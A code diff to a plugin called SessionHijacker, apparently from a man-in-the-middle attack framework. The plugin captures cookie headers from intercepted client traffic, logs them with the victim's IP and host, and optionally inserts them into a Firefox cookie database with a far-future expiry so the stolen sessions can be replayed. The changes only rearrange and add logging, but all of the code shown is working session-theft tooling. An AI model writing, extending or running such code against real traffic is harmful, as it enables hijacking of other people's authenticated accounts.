@@ -50,8 +50,6 @@ class SessionHijacker(Plugin):
 		client_ip = request.getClientIP()
 
 		if 'cookie' in headers:
-			message = "%s Got client cookie: [%s] %s" % (client_ip, headers['host'], headers['cookie'])
-
 			if self.firefox:
 				url = "http://" + headers['host'] + request.getPathFromUri()
 				for cookie in headers['cookie'].split(';'):
@@ -63,7 +61,7 @@ class SessionHijacker(Plugin):
 					#t.start()
 					self.firefoxdb(headers['host'], cname, cvalue, url, client_ip)
 			else:
-				logging.info(message)
+				logging.info("%s Got client cookie: [%s] %s" % (client_ip, headers['host'], headers['cookie']))
 
 
 	#def handleHeader(self, request, key, value): # Server => Client
@@ -120,6 +118,7 @@ class SessionHijacker(Plugin):
 		expire_date = 2000000000 #Year2033
 		now = int(time.time()) - 600
 		self.sql_conns[ip].execute('INSERT OR IGNORE INTO moz_cookies (baseDomain, name, value, host, path, expiry, lastAccessed, creationTime, isSecure, isHttpOnly) VALUES (?,?,?,?,?,?,?,?,?,?)', (basedomain,cookie_name,cookie_value,address,'/',expire_date,now,now,0,0))
+		logging.info("%s << Inserted cookie into firefox db" % ip)
 
 	def add_options(self, options):
 		options.add_argument('--firefox', dest='firefox', action='store_true', default=False, help='Create a firefox profile with captured cookies')
